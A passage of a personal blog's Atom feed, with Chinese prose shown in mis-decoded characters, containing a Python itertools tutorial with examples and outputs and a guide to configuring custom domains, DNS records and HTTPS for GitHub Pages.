    <content type="html"><![CDATA[<p>Python <code>itertools</code> æ¨¡å—æ˜¯ç”¨äºå¤„ç†è¿­ä»£å™¨çš„å·¥å…·é›†åˆã€‚ ç®€è€Œè¨€ä¹‹ï¼Œè¿­ä»£å™¨æ˜¯å¯ä»¥åœ¨forå¾ªç¯ä¸­ä½¿ç”¨çš„æ•°æ®ç±»å‹ã€‚ Pythonä¸­æœ€å¸¸è§çš„è¿­ä»£å™¨æ˜¯åˆ—è¡¨ã€‚</p><p>æœ‰å…³æ‰€æœ‰å¯èƒ½çš„ itertoolsï¼Œè¯·å‚è§ <a href="https://docs.python.org/3/library/itertools.html">https://docs.python.org/3/library/itertools.html</a>ã€‚</p><span id="more"></span><h3><span id="product">product()</span></h3><p>è¯¥å·¥å…·è®¡ç®—è¾“å…¥å¯è¿­ä»£é¡¹çš„ç¬›å¡å°”ç§¯ã€‚</p><p>å®ƒç­‰æ•ˆäºåµŒå¥—çš„forå¾ªç¯ã€‚ ä¾‹å¦‚ï¼Œ<code>product(A, B)</code>è¿” å›çš„ç»“æœä¸ <code>((x,y) for x in A for y in B)</code> ç›¸åŒã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">prod = product([<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(prod)) <span class="comment"># è¯·æ³¨æ„ï¼Œæˆ‘ä»¬å°†è¿­ä»£å™¨è½¬æ¢ä¸ºåˆ—è¡¨è¿›è¡Œæ‰“å°</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸ºäº†å…è®¸å¯è¿­ä»£å¯¹è±¡è‡ªèº«åšä¹˜ç§¯ï¼ŒæŒ‡å®šé‡å¤æ¬¡æ•°</span></span><br><span class="line">prod = product([<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>], repeat=<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(prod)) <span class="comment"># è¯·æ³¨æ„ï¼Œæˆ‘ä»¬å°†è¿­ä»£å™¨è½¬æ¢ä¸ºåˆ—è¡¨è¿›è¡Œæ‰“å°</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[(<span class="number">1</span>, <span class="number">3</span>), (<span class="number">1</span>, <span class="number">4</span>), (<span class="number">2</span>, <span class="number">3</span>), (<span class="number">2</span>, <span class="number">4</span>)]</span><br><span class="line">[(<span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>), (<span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>), (<span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>), (<span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>)]</span><br></pre></td></tr></table></figure><h3><span id="permutations">permutations()</span></h3><p>æ­¤å·¥å…·ä»¥æ‰€æœ‰å¯èƒ½çš„é¡ºåºï¼Œä»¥å¯è¿­ä»£çš„æ–¹å¼è¿”å›å…ƒç´ çš„è¿ç»­é•¿åº¦æ’åˆ—ï¼Œå¹¶ä¸”æ²¡æœ‰é‡å¤çš„å…ƒç´ ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"></span><br><span class="line">perm = permutations([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(perm))</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯é€‰ï¼šæ’åˆ—å…ƒç»„çš„é•¿åº¦</span></span><br><span class="line">perm = permutations([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(perm))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>), (<span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>), (<span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>), (<span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>), (<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>)]</span><br><span class="line">[(<span class="number">1</span>, <span class="number">2</span>), (<span class="number">1</span>, <span class="number">3</span>), (<span class="number">2</span>, <span class="number">1</span>), (<span class="number">2</span>, <span class="number">3</span>), (<span class="number">3</span>, <span class="number">1</span>), (<span class="number">3</span>, <span class="number">2</span>)]</span><br></pre></td></tr></table></figure><h3><span id="combinations-and-combinations-with-replacement">combinations() and combinations_with_replacement()</span></h3><p>é•¿åº¦rçš„å…ƒç»„ï¼ŒæŒ‰æ’åºé¡ºåºã€‚ å› æ­¤ï¼Œå¦‚æœå¯¹è¾“å…¥çš„å¯è¿­ä»£å¯¹è±¡è¿›è¡Œæ’åºï¼Œåˆ™å°†æŒ‰æ’åºé¡ºåºç”Ÿæˆç»„åˆå…ƒç»„ã€‚ <code>combinations()</code>ä¸å…è®¸é‡å¤çš„å…ƒç´ ï¼Œä½†  <code>combinations_with_replacement()</code> å…è®¸ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations, combinations_with_replacement</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¿…éœ€çš„ï¼Œå®ƒæŒ‡å®šè¾“å‡ºå…ƒç»„çš„é•¿åº¦ã€‚</span></span><br><span class="line">comb = combinations([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(comb))</span><br><span class="line"></span><br><span class="line">comb = combinations_with_replacement([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(comb))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[(<span class="number">1</span>, <span class="number">2</span>), (<span class="number">1</span>, <span class="number">3</span>), (<span class="number">1</span>, <span class="number">4</span>), (<span class="number">2</span>, <span class="number">3</span>), (<span class="number">2</span>, <span class="number">4</span>), (<span class="number">3</span>, <span class="number">4</span>)]</span><br><span class="line">[(<span class="number">1</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">2</span>), (<span class="number">1</span>, <span class="number">3</span>), (<span class="number">1</span>, <span class="number">4</span>), (<span class="number">2</span>, <span class="number">2</span>), (<span class="number">2</span>, <span class="number">3</span>), (<span class="number">2</span>, <span class="number">4</span>), (<span class="number">3</span>, <span class="number">3</span>), (<span class="number">3</span>, <span class="number">4</span>), (<span class="number">4</span>, <span class="number">4</span>)]</span><br></pre></td></tr></table></figure><h3><span id="accumulate">accumulate()</span></h3><p>ä½¿è¿­ä»£å™¨è¿”å›ç´¯åŠ çš„æ€»å’Œæˆ–å…¶ä»–äºŒè¿›åˆ¶å‡½æ•°çš„ç´¯åŠ ç»“æœã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> accumulate</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿”å›ç´¯ç§¯å’Œ</span></span><br><span class="line">acc = accumulate([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(acc))</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…¶ä»–å¯èƒ½çš„å‡½æ•°æ˜¯å¯èƒ½çš„</span></span><br><span class="line"><span class="keyword">import</span> operator</span><br><span class="line">acc = accumulate([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>], func=operator.mul)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(acc))</span><br><span class="line"></span><br><span class="line">acc = accumulate([<span class="number">1</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">4</span>], func=<span class="built_in">max</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(acc))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">10</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">24</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>]</span><br></pre></td></tr></table></figure><h3><span id="groupby">groupby()</span></h3><p>åˆ›å»ºä¸€ä¸ªè¿­ä»£å™¨ï¼Œä»è¿­ä»£å™¨è¿”å›è¿ç»­çš„é”®å’Œç»„ã€‚ é”®æ˜¯ä¸ºæ¯ä¸ªå…ƒç´ è®¡ç®—é”®å€¼çš„å‡½æ•°ã€‚ å¦‚æœæœªæŒ‡å®šæˆ–ä¸ºNoneï¼Œåˆ™é”®é»˜è®¤ä¸ºæ ‡è¯†å‡½æ•°ï¼Œå¹¶è¿”å›ä¸å˜çš„å…ƒç´ ã€‚ é€šå¸¸ï¼Œå¯è¿­ä»£é¡¹éœ€è¦å·²ç»åœ¨ç›¸åŒçš„é”®å‡½æ•°ä¸Šè¿›è¡Œäº†æ’åºã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> groupby</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨å‡½æ•°ä½œä¸ºé”®</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">smaller_than_3</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x &lt; <span class="number">3</span></span><br><span class="line"></span><br><span class="line">group_obj = groupby([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], key=smaller_than_3)</span><br><span class="line"><span class="keyword">for</span> key, group <span class="keyword">in</span> group_obj:</span><br><span class="line">    <span class="built_in">print</span>(key, <span class="built_in">list</span>(group))</span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ–è€…ä½¿ç”¨ lambda è¡¨è¾¾å¼ï¼Œæ¯”å¦‚ï¼šåŒ…å« &#x27;i&#x27; çš„è¯</span></span><br><span class="line">group_obj = groupby([<span class="string">&quot;hi&quot;</span>, <span class="string">&quot;nice&quot;</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;cool&quot;</span>], key=<span class="keyword">lambda</span> x: <span class="string">&quot;i&quot;</span> <span class="keyword">in</span> x)</span><br><span class="line"><span class="keyword">for</span> key, group <span class="keyword">in</span> group_obj:</span><br><span class="line">    <span class="built_in">print</span>(key, <span class="built_in">list</span>(group))</span><br><span class="line">    </span><br><span class="line">persons = [&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tim&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">25</span>&#125;, &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Dan&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">25</span>&#125;, </span><br><span class="line">           &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Lisa&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">27</span>&#125;, &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Claire&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">28</span>&#125;]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key, group <span class="keyword">in</span> groupby(persons, key=<span class="keyword">lambda</span> x: x[<span class="string">&#x27;age&#x27;</span>]):</span><br><span class="line">    <span class="built_in">print</span>(key, <span class="built_in">list</span>(group))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="literal">True</span> [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"><span class="literal">False</span> [<span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="literal">True</span> [<span class="string">&#x27;hi&#x27;</span>, <span class="string">&#x27;nice&#x27;</span>]</span><br><span class="line"><span class="literal">False</span> [<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;cool&#x27;</span>]</span><br><span class="line"><span class="number">25</span> [&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tim&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">25</span>&#125;, &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Dan&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">25</span>&#125;]</span><br><span class="line"><span class="number">27</span> [&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Lisa&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">27</span>&#125;]</span><br><span class="line"><span class="number">28</span> [&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Claire&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">28</span>&#125;]</span><br></pre></td></tr></table></figure><h3><span id="wu-xian-die-dai-qi-count-cycle-repeat">æ— é™è¿­ä»£å™¨ï¼šcount(), cycle(), repeat()</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count, cycle, repeat</span><br><span class="line"><span class="comment"># count(x): ä» x å¼€å§‹è®¡æ•°: x, x+1, x+2, x+3...</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> count(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">if</span>  i &gt;= <span class="number">13</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cycle(iterable) : é€šè¿‡è¿­ä»£æ— é™å¾ªç¯</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cycle([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="built_in">sum</span> += i</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span> &gt;= <span class="number">12</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># repeat(x): æ— é™é‡å¤xæˆ–é‡å¤næ¬¡</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> repeat(<span class="string">&quot;A&quot;</span>, <span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">11</span></span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="number">13</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"></span><br><span class="line">A</span><br><span class="line">A</span><br><span class="line">A</span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      07. Itertools â€” Python è¿›é˜¶
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Pages è‡ªå®šä¹‰åŸŸåå®è·µæ•´ç†</title>
    <link href="https://qiwihui.com/qiwihui-blog-47/"/>
    <id>https://qiwihui.com/qiwihui-blog-47/</id>
    <published>2022-08-13T01:54:25.310Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ç¯‡åšå®¢å°†æ•´ç†åœ¨é…ç½®åšå®¢ä»¥åŠé¡¹ç›® Pages çš„è‡ªå®šä¹‰åŸŸåè¿‡ç¨‹ï¼Œé‡åˆ°çš„é—®é¢˜ä»¥åŠè§£å†³æ–¹æ³•ã€‚<a href="https://help.github.com/articles/using-a-custom-domain-with-github-pages/">Github çš„æ–‡æ¡£</a>å¯¹äºå¦‚ä½•é…ç½®è‡ªå®šä¹‰åŸŸåæœ‰è¯¦ç»†çš„ä»‹ç»ï¼Œè¿™é‡Œä¸ä¼šå…¨éƒ¨ç¿»è¯‘ï¼Œåªé‡ç‚¹è®°å½•å®è·µçš„è¿‡ç¨‹ï¼Œå†…å®¹æ¶‰åŠä¸ºç”¨æˆ·ç½‘ç«™ï¼Œå…¬å¸ç½‘ç«™ï¼Œä»¥åŠé¡¹ç›®ç½‘ç«™æ·»åŠ  <code>Apex</code> åŸŸåï¼ˆ<a href="http://qiwihui.com">qiwihui.com</a>ï¼‰ï¼ŒäºŒçº§åŸŸåï¼ˆ<a href="http://www.qiwihui.com">www.qiwihui.com</a>ï¼‰ä»¥åŠå¼€å¯ HTTPSã€‚æœ€åï¼Œæ‰€æœ‰æŒ‡å‘ <code>www.qiwihui.com</code> çš„è¯·æ±‚å°†ä¼šè¢«é‡å®šå‘è‡³ <code>https://qiwihui.com</code>ã€‚</p><span id="more"></span><h2><span id="yi-xie-zhu-yi">ä¸€äº›æ³¨æ„</span></h2><h3><span id="github-zhi-chi-de-zi-ding-yi-yu-ming-lei-xing">Github æ”¯æŒçš„è‡ªå®šä¹‰åŸŸåç±»å‹</span></h3><table><thead><tr><th>æ”¯æŒçš„è‡ªå®šä¹‰åŸŸåç±»å‹</th><th>åŸŸåä¾‹å­</th></tr></thead><tbody><tr><td>wwwÂ subdomain</td><td><code>www.example.com</code></td></tr><tr><td><strong>one apex domain &amp; oneÂ wwwÂ subdomain</strong></td><td><code>example.com</code>Â &amp;Â <code>www.example.com</code></td></tr><tr><td>apex domain</td><td><code>example.com</code></td></tr><tr><td>custom subdomain</td><td><code>blog.example.com</code></td></tr></tbody></table><h3><span id="github-pages-zhan-zhi-chi-de-yu-ming">GitHub Pages ç«™æ”¯æŒçš„åŸŸå</span></h3><table><thead><tr><th>GitHub Pages ç«™ç±»å‹</th><th>åœ¨ Github ä¸Š Pages çš„é»˜è®¤åŸŸåå’Œä¸»æœºåœ°å€</th><th>é¡µé¢è¢«å¦‚ä½•é‡å®šå‘</th><th>è‡ªå®šä¹‰åŸŸåä¸¾ä¾‹</th></tr></thead><tbody><tr><td>User Pages ç«™</td><td><code>username.github.io</code></td><td>è‡ªåŠ¨é‡å®šå‘åˆ°è®¾ç½®çš„è‡ªå®šä¹‰åŸŸå</td><td><code>user.example.com</code></td></tr><tr><td>Organization Pages ç«™</td><td><code>orgname.github.io</code></td><td>è‡ªåŠ¨é‡å®šå‘åˆ°è®¾ç½®çš„è‡ªå®šä¹‰åŸŸå</td><td><code>org.example.com</code></td></tr><tr><td>ç”¨æˆ·æ‹¥æœ‰çš„ Project Pages ç«™</td><td><code>username.github.io/projectname</code></td><td>è‡ªåŠ¨é‡å®šå‘åˆ° User Pages ç«™è‡ªå®šä¹‰åŸŸåçš„å­ç›®å½•ï¼ˆ<code>user.example.com/projectname</code>ï¼‰</td><td><code>project.example.com</code></td></tr><tr><td>å…¬å¸æ‹¥æœ‰çš„ Project Pages ç«™</td><td><code>orgname.github.io/projectname</code></td><td>è‡ªåŠ¨é‡å®šå‘åˆ° Organization Pages ç«™è‡ªå®šä¹‰åŸŸåçš„å­ç›®å½•ï¼ˆ<code>org.example.com/projectname</code>ï¼‰</td><td><code>project.example.com</code></td></tr></tbody></table><h2><span id="yi-ge-ren-pages-xiang-mu-wei-li-zi">ä»¥ä¸ªäºº Pages é¡¹ç›®ä¸ºä¾‹å­</span></h2><h3><span id="kai-qi-github-pages-gong-neng">å¼€å¯ Github Pages åŠŸèƒ½</span></h3><p>åœ¨é¡¹ç›® <code>Settings</code> ä¸­ï¼Œæ‰¾åˆ° <code>GitHub Pages</code> è¿™ä¸€åŒºåŸŸï¼Œé€‰æ‹© <code>Source</code> ä¸ºå¯¹åº”çš„è¦éƒ¨ç½²çš„åˆ†æ”¯ï¼Œè¿™é‡Œæˆ‘é€‰æ‹© <code>gh-pages branch</code>ï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/51802835-b4756580-2288-11e9-8aab-b5add026d737.png" alt="gh-pages"></p><p>å…¶ä¸­ï¼Œé€‰æ‹© <code>master branch</code> ä¼šè§† <code>/README.md</code> ä¸º web çš„ <code>index.html</code>ï¼Œé€‰æ‹© <code>master branch /docs folder</code> ä¼šè§† <code>/docs/README.md</code> ä¸º web çš„ <code>index.html</code>ã€‚</p><h3><span id="zai-xiang-mu-pei-zhi-zhong-zi-ding-yi-yu-ming">åœ¨é¡¹ç›®é…ç½®ä¸­è‡ªå®šä¹‰åŸŸå</span></h3><p>åœ¨ <code>Custom domain</code> ä¸­æ·»åŠ è‡ªå·±çš„åŸŸåå¹¶ä¿å­˜ï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/51802765-141f4100-2288-11e9-8e8d-8980ed3e63b3.png" alt="custom-domain"></p><p>æˆ–è€…ï¼Œåœ¨é¡¹ç›®åˆ†æ”¯ä¸­æ·»åŠ  <code>CNAME</code> æ–‡ä»¶ï¼Œ<code>CNAME</code> æ–‡ä»¶çš„å†…å®¹ä¸º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qiwihui.com</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ¨èç¬¬äºŒç§ï¼Œå°¤å…¶å¯¹äºæœ‰è®¾ç½® CI çš„é¡¹ç›®ï¼Œå› ä¸º CI ä¸Šå°†ç¬¬ä¸€ç§è®¾ç½®è¦†ç›–ã€‚è¿™ä¸€æ­¥æ˜¯æ¯”è¾ƒé‡è¦å´åˆå®¹æ˜“å¿½è§†çš„ä¸€æ­¥ï¼š</p><ul><li>å¦‚æœæ·»åŠ åˆ° GitHub Pages ä¸­çš„æ˜¯ <code>qiwihui.com</code>ï¼Œé‚£ä¹ˆ <code>www.qiwihui.com</code> ä¼šè¢«é‡å®šå‘åˆ° <code>qiwihui.com</code>ï¼›</li><li>å¦‚æœæ·»åŠ åˆ° GitHub Pages ä¸­çš„æ˜¯ <code>www.qiwihui.com</code>ï¼Œé‚£ä¹ˆ <code>qiwihui.com</code> ä¼šè¢«é‡å®šå‘åˆ° <code>www.qiwihui.com</code>ï¼›</li></ul><p>è¿™é‡Œæˆ‘é€‰æ‹©é‡å®šå‘åˆ° <code>www.qiwihui.com</code>ï¼Œæ‰€ä»¥è®¾ç½®ä¸º <code>qiwihui.com</code></p><h3><span id="tian-jia-dns-ji-lu">æ·»åŠ  DNS è®°å½•</span></h3><p>ä¸ºäº†èƒ½è®¾ç½®<code>Apex</code> åŸŸåï¼Œéœ€è¦åœ¨ DNS ä¸­é…ç½® A è®°å½•æŒ‡å‘ github çš„ IPï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">185.199.108.153</span><br><span class="line">185.199.109.153</span><br><span class="line">185.199.110.153</span><br><span class="line">185.199.111.153</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/3297411/51803023-1040ee00-228b-11e9-90f7-20a4a99d9069.png" alt="a-record"></p><p>åŒæ—¶ï¼Œè®¾ç½® <code>CNAME</code>  è®°å½•å°† <code>www.qiwihui.com</code> æŒ‡å‘ <code>qiwihui.github.io</code>ï¼Œå³ <code>&lt;ä½ çš„ github ç”¨æˆ·å&gt;.github.io</code>ã€‚å¯¹äºå…¬å¸æ¥è¯´ï¼Œè¿™ä¸ªåœ°å€æ˜¯ <code>&lt;å…¬å¸åç§°&gt;.github.io</code>ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/51803045-539b5c80-228b-11e9-8e60-03c854f7097b.png" alt="www-record"></p><h3><span id="que-ren-dns-ji-lu">ç¡®è®¤ DNS è®°å½•</span></h3><p>ä»¥ä¸‹æ˜¯è®¾ç½®å¥½ä¹‹åçš„ DNS è®°å½•æƒ…å†µï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dig +noall +answer qiwihui.com</span><br><span class="line">qiwihui.com.            60      IN      A       185.199.111.153</span><br><span class="line">qiwihui.com.            60      IN      A       185.199.110.153</span><br><span class="line">qiwihui.com.            60      IN      A       185.199.108.153</span><br><span class="line">qiwihui.com.            60      IN      A       185.199.109.153</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dig www.qiwihui.com +nostats +nocomments +nocmd </span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; www.qiwihui.com +nostats +nocomments +nocmd</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;www.qiwihui.com.               IN      A</span><br><span class="line">www.qiwihui.com.        28      IN      CNAME   qiwihui.github.io.</span><br><span class="line">qiwihui.github.io.      28      IN      A       185.199.110.153</span><br><span class="line">qiwihui.github.io.      28      IN      A       185.199.108.153</span><br><span class="line">qiwihui.github.io.      28      IN      A       185.199.111.153</span><br><span class="line">qiwihui.github.io.      28      IN      A       185.199.109.153</span><br></pre></td></tr></table></figure><h3><span id="ssl-https-pei-zhi-qiang-lie-tui-jian-kai-qi">SSLï¼ˆHTTPSï¼‰é…ç½®ï¼Œå¼ºçƒˆæ¨èå¼€å¯</span></h3><p>å‹¾é€‰ <code>Enforce HTTPS</code></p><p><img src="https://user-images.githubusercontent.com/3297411/51798435-2760eb00-224d-11e9-917c-a4942a652d35.png" alt="enfore_https"></p><p>Github ä¼šè‡ªåŠ¨ä¿æŒ HTTPS è¯ä¹¦çš„æœ‰æ•ˆã€‚</p><h2><span id="xiang-mu-pages">é¡¹ç›® Pages</span></h2><p>å½“ç»™é¡¹ç›®è®¾ç½® Pages æ—¶ï¼Œä¸€èˆ¬éƒ½å·²ç»æœ‰ä¸€ä¸ªä¸ªäººæˆ–è€…å…¬å¸çš„ Pages äº†ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå°±å¯ä»¥æŒ‰ä»¥ä¸Šçš„è¿‡ç¨‹æ·»åŠ ã€‚å¦‚æœå·²ç»è®¾ç½®äº†ï¼Œåˆ™åªéœ€è¦å¾ˆç®€å•çš„ä¸¤æ­¥å³å¯ï¼š</p><p>ä»¥ä¸‹ä»¥ä¸ªäººé¡¹ç›® <code>[qiwihui/fullstackpython.com](https://github.com/qiwihui/fullstackpython.com)</code>ï¼Œè®¾ç½®åœ°å€ä¸º <code>fullstackpython.qiwihui.com</code></p><ol><li>åœ¨é¡¹ç›®ä¸­å¼€å¯ Github Pagesï¼Œå¹¶æ·»åŠ  <code>CNAME</code> æ–‡ä»¶æŒ‡å‘ <code>fullstackpython.qiwihui.com</code>ï¼š</li></ol><p><img src="https://user-images.githubusercontent.com/3297411/51803267-2dc38700-228e-11e9-8ee8-03e80ec711c9.png" alt="fullstackpython"></p><ol start="2"><li>åœ¨ DNS è®°å½•ä¸­æ·»åŠ  CNAME è®°å½•å°† <code>fullstackpython.qiwihui.com</code> æŒ‡å‘ <code>qiwihui.github.io</code>ï¼Œå³ <code>&lt;ä½ çš„ github ç”¨æˆ·å&gt;.github.io</code>ã€‚å¯¹äºå…¬å¸æ¥è¯´ï¼Œè¿™ä¸ªåœ°å€æ˜¯ <code>&lt;å…¬å¸åç§°&gt;.github.io</code>ã€‚</li></ol><p><img src="https://user-images.githubusercontent.com/3297411/51803299-8004a800-228e-11e9-8721-e640e4377df1.png" alt="fullstackpython-record"></p><p>ä¸€æ®µæ—¶é—´åå³å¯ã€‚</p><h2><span id="can-kao">å‚è€ƒ</span></h2><ul><li><a href="https://help.github.com/articles/using-a-custom-domain-with-github-pages/">Using a custom domain with GitHub Pages</a></li><li><a href="https://help.github.com/articles/custom-domain-redirects-for-github-pages-sites/">Custom domain redirects for GitHub Pages sites</a></li><li><a href="https://stackoverflow.com/a/9123911/3218128">Custom domain for GitHub project pages çš„å›ç­”</a></li><li><a href="https://anmonteiro.com/2015/08/custom-subdomains-in-github-project-pages/">Custom subdomains in GitHub project pages</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Pages è‡ªå®šä¹‰åŸŸåå®è·µæ•´ç†
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
